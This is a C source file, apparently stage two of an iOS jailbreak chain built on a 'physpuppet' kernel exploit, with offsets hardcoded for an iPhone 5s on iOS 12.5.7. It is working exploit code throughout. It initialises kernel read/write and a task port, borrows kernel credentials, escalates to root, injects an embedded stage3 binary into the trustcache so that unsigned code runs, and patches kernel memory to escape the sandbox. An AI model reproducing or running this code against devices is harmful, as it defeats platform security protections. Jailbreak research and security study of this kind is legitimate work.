#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <spawn.h>
#include <inttypes.h>

#include "common.h"
#include "stage3.h"
#include "trustcache.h"
#include "hsp4.h"
#include "kutils.h"
#include "log.h"
#include "physpuppet/exploit.h"
#include "physpuppet/libprejailbreak.h"
#include "physpuppet/offsets.h"
#include "physpuppet/utils.h"
#include "physpuppet/tfp0.h"

extern mach_port_t tfp0;

char stage3_path[1024];

int launch_stage3(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t spawned_pid;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&spawned_pid, binary, NULL, NULL, (char **)&args, env);

    uint64_t spawned_ucred = borrow_ucreds(spawned_pid, 1);

    while (access("/tmp/stage3_got_hsp4", F_OK) != 0) {usleep(100000u);};

    unborrow_ucreds(spawned_pid, spawned_ucred);

    if (rv) return rv;
    
    return 0;
}

int extract_stage3(void) {
  memset(stage3_path, 0, 1024);
  strcpy(stage3_path, "/var/containers/Bundle/stage3");
  unlink(stage3_path);

  FILE *f = fopen(stage3_path, "wb");

  size_t total_size = sizeof(stage3);
  fwrite(stage3, 1, total_size, f);

  fclose(f);
  LOG("Wrote stage3 (%zu bytes), stage3_path = %s", total_size, stage3_path);

  return 0;
}

int main() {
  LOG("[stage2] loaded");

  kernel_rw_init();
  tfp0_init();

  uint64_t self_ucred = borrow_ucreds(getpid(), 1);

  setuid(0); setuid(0);

  patch_hsp4();

  // prepare stage3
  extract_stage3();
  int tc_ret = inject_trustcache(stage3_path, (kinfo(slide) + 0xfffffff008930e80)); // XXX HARDCODED offsets; 5s 12.5.7 
  LOG("inject_trustcache ret = %d", tc_ret);
  chmod(stage3_path, 0755);
  
  unborrow_ucreds(getpid(), self_ucred);

  // unsandbox
  uint32_t off_sandbox_slot = 0x10;
  uint64_t saved_sb = kread64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot);
  kwrite64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot, 0);

  char kernel_base_str[19];
  memset(kernel_base_str, 0, 19);
  snprintf(kernel_base_str, sizeof(kernel_base_str), "0x%016" PRIx64, (0xFFFFFFF007004000 + kinfo(slide)));

  char kern_proc_str[19];
  memset(kern_proc_str, 0, 19);
  snprintf(kern_proc_str, sizeof(kern_proc_str), "0x%016" PRIx64, kinfo(proc));

  char trustcache_str[19];
  memset(trustcache_str, 0, 19);
  snprintf(trustcache_str, sizeof(trustcache_str), "0x%016" PRIx64, 0xfffffff008930e80 + kinfo(slide)); // XXX HARDCODED offsets; 5s 12.5.7 

  launch_stage3(stage3_path, kernel_base_str, kern_proc_str, trustcache_str, NULL, NULL, NULL, NULL);

  //restore sandbox
  kwrite64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot, saved_sb);

  while(1) {};

  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
